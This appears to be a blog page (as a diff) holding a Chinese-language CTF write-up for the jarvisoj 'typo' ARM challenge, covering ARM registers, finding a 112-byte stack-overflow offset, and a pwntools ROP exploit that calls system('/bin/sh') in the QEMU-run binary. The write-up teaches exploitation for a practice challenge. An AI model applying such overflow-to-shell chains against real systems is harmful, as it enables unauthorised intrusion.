@@ -1,0 +1,215 @@
+<!-- 雪花特效 -->
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<script type="text/javascript" src="\js\snow.js"></script><!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>jarvisoj_typo(arm_pwn) | s4ndw1ch's Blog</title><meta name="author" content="s4ndw1ch"><meta name="copyright" content="s4ndw1ch"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="jarvisoj-typo(arm_pwn)checksec 32位的arm架构 arm概述12ARM架构过去称作进阶精简指令集机器（Advanced RISC Machine，更早称作：Acorn RISC Machine），是一个精简指令集（RISC）处理器架构，其广泛地使用在许多嵌入式系统设计。由于节能的特点，ARM处理器非常适用于移动通讯领域，符合其主要设计目标为低耗电的特性。因此我们常用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jarvisoj_typo(arm_pwn)">
+<meta property="og:url" content="http://s4ndw1ch136.github.io/post/647ece5c.html">
+<meta property="og:site_name" content="s4ndw1ch&#39;s Blog">
+<meta property="og:description" content="jarvisoj-typo(arm_pwn)checksec 32位的arm架构 arm概述12ARM架构过去称作进阶精简指令集机器（Advanced RISC Machine，更早称作：Acorn RISC Machine），是一个精简指令集（RISC）处理器架构，其广泛地使用在许多嵌入式系统设计。由于节能的特点，ARM处理器非常适用于移动通讯领域，符合其主要设计目标为低耗电的特性。因此我们常用">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://s4ndw1ch136.github.io/img/arm.jpg">
+<meta property="article:published_time" content="2023-07-23T05:23:22.000Z">
+<meta property="article:modified_time" content="2023-07-23T12:40:38.017Z">
+<meta property="article:author" content="s4ndw1ch">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="ARM_PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://s4ndw1ch136.github.io/img/arm.jpg"><link rel="shortcut icon" href="/img/a.jpg"><link rel="canonical" href="http://s4ndw1ch136.github.io/post/647ece5c.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'jarvisoj_typo(arm_pwn)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-07-23 20:40:38'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/mouse.css"><link rel="stylesheet" href="/css/touming.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/a.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">23</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">6</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about"><i class="fa-fw /about/"></i><span> 0</span></a></li><li><a class="site-page child" href="/myself"><i class="fa-fw /myself/"></i><span> 1</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/arm.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="s4ndw1ch's Blog"><span class="site-name">s4ndw1ch's Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about"><i class="fa-fw /about/"></i><span> 0</span></a></li><li><a class="site-page child" href="/myself"><i class="fa-fw /myself/"></i><span> 1</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">jarvisoj_typo(arm_pwn)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-07-23T05:23:22.000Z" title="Created 2023-07-23 13:23:22">2023-07-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-07-23T12:40:38.017Z" title="Updated 2023-07-23 20:40:38">2023-07-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/ARM-PWN/">ARM_PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="jarvisoj_typo(arm_pwn)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="jarvisoj-typo-arm-pwn"><a href="#jarvisoj-typo-arm-pwn" class="headerlink" title="jarvisoj-typo(arm_pwn)"></a>jarvisoj-typo(arm_pwn)</h1><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p><img src="/post/647ece5c/1.jpg" alt="1"></p>
+<p>32位的arm架构</p>
+<h3 id="arm概述"><a href="#arm概述" class="headerlink" title="arm概述"></a>arm概述</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ARM架构过去称作进阶精简指令集机器（Advanced RISC Machine，更早称作：Acorn RISC Machine），是一个精简指令集（RISC）处理器架构，其广泛地使用在许多嵌入式系统设计。由于节能的特点，ARM处理器非常适用于移动通讯领域，符合其主要设计目标为低耗电的特性。因此我们常用的手机、平板等移动设备都是采用ARM体系架构的</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="使用QEMU进行模拟运行"><a href="#使用QEMU进行模拟运行" class="headerlink" title="使用QEMU进行模拟运行"></a>使用QEMU进行模拟运行</h3><p>qemu是一个通用的、开源的机器仿真器和虚拟机。如何安装以及调试不同架构在IOT环境搭建里有介绍，这里不再重复</p>
+<h3 id="arm架构的基础知识"><a href="#arm架构的基础知识" class="headerlink" title="arm架构的基础知识"></a>arm架构的基础知识</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><p>关于arm的函数调用约定，函数的第 1 ～ 4 个参数分别保存在 r0 ～ r3 寄存器中， 剩下的参数从右向左依次入栈， 被调用者实现栈平衡，函数的返回值保存在 r0 中。除此之外，arm 的 b/bl 等指令实现跳转; pc 寄存器相当于 x86 的 eip，保存下一条指令的地址，也是我们要控制的目标。<br><img src="/post/647ece5c/2.png" alt="2"></p>
+<p><img src="/post/647ece5c/3.jpg" alt="3"></p>
+<h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><p>其中寄存器用x[n]表示64位的，8字节，w[n]表示取低32位，4字节，x0~x7用来实现函数传参，不够则使用栈来传递，x0用来存放函数的返回值。x29即fp，栈底指针寄存器；x30即lr，用来保存子程序的返回地址。sp栈顶指针寄存器，指向栈顶数据；pc指令指针寄存器，存放下一条指令地址；cpsr程序状态寄存器。</p>
+<p><img src="/post/647ece5c/5.jpg" alt="5"></p>
+<h3 id="了解大致程序流程"><a href="#了解大致程序流程" class="headerlink" title="了解大致程序流程"></a>了解大致程序流程</h3><p>再回头来看这道题，这题是静态链接的，所以拖进IDA里的代码量很大，但是如果我们想要去找一些函数（system()函数）或者字符串（比如/binsh）都可以在程序中搜索到</p>
+<p><img src="/post/647ece5c/6.jpg" alt="6"></p>
+<p>首先输入回车begin，然后还会给我们输入，但是如果输入的数据过长会导致核心转储，存在栈溢出，这里在IDA里面因为扣了符号表，我们不能直观的去找到栈溢出的偏移，我们可以尝试gdb动态调试<img src="/post/647ece5c/7.jpg" alt="7"></p>
+<p>我们在第二处输入点输入cyclic200生成的字符串，pc指针指向0x62616164发生了崩溃，cyclic -l 0x62616164得到偏移为112</p>
+<p>再在IDA里查找字符串/bin/sh，ctrl+x查看交叉引用，来到sub_10BA8()函数，基本能确定这就是我们要的ret_addr了</p>
+<p>那么现在我们需要一段gadget来控制r0寄存器就行了</p>
+<p><img src="/post/647ece5c/8.jpg" alt="8"></p>
+<p>找到了一条gadget，那么可以编写exp了</p>
+<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&quot;arm&quot;</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;./typo&quot;</span>])</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x0006c384</span></span><br><span class="line">pop_r0_r4_pc = <span class="number">0x00020904</span></span><br><span class="line">system = <span class="number">0x000110B4</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">112</span> + p32(pop_r0_r4_pc) + p32(binsh)*<span class="number">2</span> + p32(system)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;quit\n&quot;</span>)</span><br><span class="line">io.send(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://s4ndw1ch136.github.io">s4ndw1ch</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://s4ndw1ch136.github.io/post/647ece5c.html">http://s4ndw1ch136.github.io/post/647ece5c.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a><a class="post-meta__tags" href="/tags/ARM-PWN/">ARM_PWN</a></div><div class="post_share"><div class="social-share" data-image="/img/arm.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/384eb55.html" title="Shanghai2018_baby_arm"><img class="cover" src="/img/arm.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Shanghai2018_baby_arm</div></div></a></div><div class="next-post pull-right"><a href="/post/68b9fe98.html" title="suctf2018_heap"><img class="cover" src="/img/wallhaven-jx1dmq.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">suctf2018_heap</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/post/384eb55.html" title="Shanghai2018_baby_arm"><img class="cover" src="/img/arm.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-23</div><div class="title">Shanghai2018_baby_arm</div></div></a></div><div><a href="/post/a942ef61.html" title="BSidesCF2019-Runit"><img class="cover" src="/img/wallhaven-jx1dmq.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-11</div><div class="title">BSidesCF2019-Runit</div></div></a></div><div><a href="/post/bb049d32.html" title="BUUCTF-ciscn_2019_es_7"><img class="cover" src="/img/wallhaven-jx1dmq.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-11</div><div class="title">BUUCTF-ciscn_2019_es_7</div></div></a></div><div><a href="/post/16910.html" title="BUUCTF-pwnable_hacknote"><img class="cover" src="/img/wallhaven-jx1dmq.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-08</div><div class="title">BUUCTF-pwnable_hacknote</div></div></a></div><div><a href="/post/a094319f.html" title="HITCON_2018_children_tcache"><img class="cover" src="/img/wallhaven-jx1dmq.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-06</div><div class="title">HITCON_2018_children_tcache</div></div></a></div><div><a href="/post/30b5a622.html" title="axb_2019_heap"><img class="cover" src="/img/wallhaven-jx1dmq.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-23</div><div class="title">axb_2019_heap</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/a.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">s4ndw1ch</div><div class="author-info__description">The closer you get  The less you see</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">23</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/s4ndw1ch136"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">VX:s4ndw1ch_vx</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#jarvisoj-typo-arm-pwn"><span class="toc-number">1.</span> <span class="toc-text">jarvisoj-typo(arm_pwn)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec"><span class="toc-number">1.0.1.</span> <span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#arm%E6%A6%82%E8%BF%B0"><span class="toc-number">1.0.2.</span> <span class="toc-text">arm概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8QEMU%E8%BF%9B%E8%A1%8C%E6%A8%A1%E6%8B%9F%E8%BF%90%E8%A1%8C"><span class="toc-number">1.0.3.</span> <span class="toc-text">使用QEMU进行模拟运行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#arm%E6%9E%B6%E6%9E%84%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.0.4.</span> <span class="toc-text">arm架构的基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#32%E4%BD%8D"><span class="toc-number">1.0.4.1.</span> <span class="toc-text">32位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#64%E4%BD%8D"><span class="toc-number">1.0.4.2.</span> <span class="toc-text">64位</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3%E5%A4%A7%E8%87%B4%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B"><span class="toc-number">1.0.5.</span> <span class="toc-text">了解大致程序流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp%EF%BC%9A"><span class="toc-number">1.0.6.</span> <span class="toc-text">exp：</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/863f83d.html" title="ciscn_2019_n_7"><img src="/img/wallhaven-jx1dmq.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ciscn_2019_n_7"/></a><div class="content"><a class="title" href="/post/863f83d.html" title="ciscn_2019_n_7">ciscn_2019_n_7</a><time datetime="2023-07-24T14:51:51.000Z" title="Created 2023-07-24 22:51:51">2023-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/384eb55.html" title="Shanghai2018_baby_arm"><img src="/img/arm.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Shanghai2018_baby_arm"/></a><div class="content"><a class="title" href="/post/384eb55.html" title="Shanghai2018_baby_arm">Shanghai2018_baby_arm</a><time datetime="2023-07-23T14:31:20.000Z" title="Created 2023-07-23 22:31:20">2023-07-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/647ece5c.html" title="jarvisoj_typo(arm_pwn)"><img src="/img/arm.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="jarvisoj_typo(arm_pwn)"/></a><div class="content"><a class="title" href="/post/647ece5c.html" title="jarvisoj_typo(arm_pwn)">jarvisoj_typo(arm_pwn)</a><time datetime="2023-07-23T05:23:22.000Z" title="Created 2023-07-23 13:23:22">2023-07-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/68b9fe98.html" title="suctf2018_heap"><img src="/img/wallhaven-jx1dmq.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="suctf2018_heap"/></a><div class="content"><a class="title" href="/post/68b9fe98.html" title="suctf2018_heap">suctf2018_heap</a><time datetime="2023-07-06T06:31:04.000Z" title="Created 2023-07-06 14:31:04">2023-07-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/d526b6ea.html" title="MIPS交叉编译调试环境搭建"><img src="/img/wallhaven-jx1dmq.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MIPS交叉编译调试环境搭建"/></a><div class="content"><a class="title" href="/post/d526b6ea.html" title="MIPS交叉编译调试环境搭建">MIPS交叉编译调试环境搭建</a><time datetime="2023-06-28T10:26:50.000Z" title="Created 2023-06-28 18:26:50">2023-06-28</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/arm.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By s4ndw1ch</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_footer_beautify_injector_config(){
+    var parent_div_git = document.getElementById('footer-wrap');
+    var item_html = '<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo" title=""><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题使用Butterfly" title=""><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a></p>';
+    console.log('已挂载butterfly_footer_beautify')
+    parent_div_git.insertAdjacentHTML("beforeend",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_footer_beautify_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_footer_beautify_injector_config();
+  }
+  </script><script async src="/js/runtime.js"></script><!-- hexo injector body_end end --></body></html>
